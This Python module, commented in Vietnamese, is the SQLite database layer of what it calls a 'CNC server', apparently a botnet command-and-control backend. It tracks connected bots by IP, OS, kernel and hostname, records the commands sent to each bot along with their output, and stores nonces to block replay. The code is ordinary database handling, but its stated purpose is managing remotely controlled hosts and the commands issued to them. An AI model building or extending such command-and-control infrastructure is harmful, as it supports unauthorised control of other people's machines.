"""
SQLite database cho CNC server — lưu bot list, command history, nonces.

Dùng aiosqlite để không block asyncio event loop.
"""

import json
import logging
import time
from pathlib import Path

import aiosqlite

logger = logging.getLogger(__name__)

SCHEMA = """
CREATE TABLE IF NOT EXISTS bots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    bot_id TEXT UNIQUE NOT NULL,
    ip TEXT NOT NULL,
    port INTEGER NOT NULL DEFAULT 0,
    os TEXT DEFAULT '',
    os_version TEXT DEFAULT '',
    arch TEXT DEFAULT '',
    kernel TEXT DEFAULT '',
    hostname TEXT DEFAULT '',
    first_seen REAL NOT NULL,
    last_seen REAL NOT NULL,
    status TEXT NOT NULL DEFAULT 'online',
    session_id TEXT DEFAULT ''
);

CREATE TABLE IF NOT EXISTS commands (
    id TEXT PRIMARY KEY,
    bot_id TEXT NOT NULL,
    module TEXT NOT NULL,
    params TEXT NOT NULL DEFAULT '{}',
    output TEXT DEFAULT '',
    exit_code INTEGER DEFAULT -1,
    created_at REAL NOT NULL,
    completed_at REAL DEFAULT NULL
);

CREATE TABLE IF NOT EXISTS nonces (
    nonce TEXT PRIMARY KEY,
    used_at REAL NOT NULL
);
"""


class Database:
    def __init__(self, path: str = "cnc.db"):
        self.path = path
        self._conn: aiosqlite.Connection | None = None

    async def connect(self):
        self._conn = await aiosqlite.connect(self.path)
        self._conn.row_factory = aiosqlite.Row
        await self._conn.executescript(SCHEMA)
        await self._conn.commit()
        logger.info("Database connected: %s", self.path)

    async def close(self):
        if self._conn:
            await self._conn.close()
            self._conn = None

    # ── bots ────────────────────────────────────────────────

    async def add_bot(self, bot_id: str, ip: str, port: int, os_name: str = "",
                      os_version: str = "", arch: str = "", kernel: str = "",
                      hostname: str = "", session_id: str = "") -> int:
        now = time.time()
        await self._conn.execute(
            """INSERT OR REPLACE INTO bots (bot_id, ip, port, os, os_version, arch, kernel, hostname, first_seen, last_seen, status, session_id)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, COALESCE((SELECT first_seen FROM bots WHERE bot_id=?), ?), ?, 'online', ?)""",
            (bot_id, ip, port, os_name, os_version, arch, kernel, hostname, bot_id, now, now, session_id),
        )
        await self._conn.commit()
        row = await self._conn.execute("SELECT id FROM bots WHERE bot_id=?", (bot_id,))
        return (await row.fetchone())["id"]

    async def update_bot_last_seen(self, bot_id: str):
        await self._conn.execute(
            "UPDATE bots SET last_seen=?, status='online' WHERE bot_id=?",
            (time.time(), bot_id),
        )
        await self._conn.commit()

    async def mark_bot_offline(self, bot_id: str):
        await self._conn.execute(
            "UPDATE bots SET status='offline' WHERE bot_id=?",
            (bot_id,),
        )
        await self._conn.commit()

    async def get_bot(self, bot_id: str) -> dict | None:
        row = await self._conn.execute("SELECT * FROM bots WHERE bot_id=?", (bot_id,))
        r = await row.fetchone()
        return dict(r) if r else None

    async def get_bot_by_db_id(self, db_id: int) -> dict | None:
        row = await self._conn.execute("SELECT * FROM bots WHERE id=?", (db_id,))
        r = await row.fetchone()
        return dict(r) if r else None

    async def list_bots(self) -> list[dict]:
        rows = await self._conn.execute("SELECT * FROM bots ORDER BY last_seen DESC")
        return [dict(r) for r in await rows.fetchall()]

    async def count_bots(self) -> dict:
        total = await self._conn.execute("SELECT COUNT(*) FROM bots")
        total = (await total.fetchone())[0]
        online = await self._conn.execute("SELECT COUNT(*) FROM bots WHERE status='online'")
        online = (await online.fetchone())[0]
        by_os = await self._conn.execute(
            "SELECT os_version, COUNT(*) as c FROM bots WHERE os_version != '' GROUP BY os_version ORDER BY c DESC"
        )
        by_os = [(r["os_version"], r["c"]) for r in await by_os.fetchall()]
        return {"total": total, "online": online, "offline": total - online, "by_os": by_os}

    async def get_offline_bots(self, timeout: float) -> list[dict]:
        cutoff = time.time() - timeout
        rows = await self._conn.execute(
            "SELECT * FROM bots WHERE status='online' AND last_seen < ?", (cutoff,)
        )
        return [dict(r) for r in await rows.fetchall()]

    # ── commands ────────────────────────────────────────────

    async def add_command(self, cmd_id: str, bot_id: str, module: str, params: dict):
        await self._conn.execute(
            "INSERT INTO commands (id, bot_id, module, params, created_at) VALUES (?, ?, ?, ?, ?)",
            (cmd_id, bot_id, module, json.dumps(params), time.time()),
        )
        await self._conn.commit()

    async def update_command(self, cmd_id: str, output: str, exit_code: int):
        await self._conn.execute(
            "UPDATE commands SET output=?, exit_code=?, completed_at=? WHERE id=?",
            (output, exit_code, time.time(), cmd_id),
        )
        await self._conn.commit()

    async def get_command(self, cmd_id: str) -> dict | None:
        row = await self._conn.execute("SELECT * FROM commands WHERE id=?", (cmd_id,))
        r = await row.fetchone()
        return dict(r) if r else None

    # ── nonces (chống replay) ───────────────────────────────

    async def is_nonce_used(self, nonce: str) -> bool:
        row = await self._conn.execute("SELECT 1 FROM nonces WHERE nonce=?", (nonce,))
        return (await row.fetchone()) is not None

    async def mark_nonce(self, nonce: str):
        await self._conn.execute("INSERT INTO nonces (nonce, used_at) VALUES (?, ?)", (nonce, time.time()))
        await self._conn.commit()

    async def cleanup_old_nonces(self, max_age: float = 300.0):
        cutoff = time.time() - max_age
        await self._conn.execute("DELETE FROM nonces WHERE used_at < ?", (cutoff,))
        await self._conn.commit()
